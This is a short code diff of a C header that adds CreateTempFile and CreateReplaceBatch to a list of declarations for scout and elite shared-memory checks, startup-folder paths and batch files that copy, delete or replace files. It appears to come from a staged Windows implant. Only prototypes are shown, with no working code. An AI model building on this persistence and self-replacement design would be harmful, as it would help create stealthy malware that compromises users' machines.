@@ -14,6 +14,7 @@ VOID Drop();
 VOID DoCopyFile(PWCHAR pSource, PWCHAR pDest);
 PCHAR GetScoutSharedMemoryName();
 PCHAR GetEliteSharedMemoryName();
+LPWSTR CreateTempFile();
 BOOL CreateScoutSharedMemory();
 BOOL ExistsScoutSharedMemory();
 BOOL ExistsEliteSharedMemory();
@@ -21,6 +22,7 @@ BOOL AmIFromStartup();
 BOOL StartBatch(PWCHAR pName);
 VOID CreateCopyBatch(PWCHAR pSource, PWCHAR pDest, PWCHAR *pBatchOutName);
 VOID CreateDeleteBatch(PWCHAR pFileName, PWCHAR *pBatchOutName);
+VOID CreateReplaceBatch(PWCHAR pOldFile, PWCHAR pNewFile, PWCHAR *pBatchOutName);
 
 PWCHAR GetStartupPath();
 PWCHAR GetStartupScoutName();
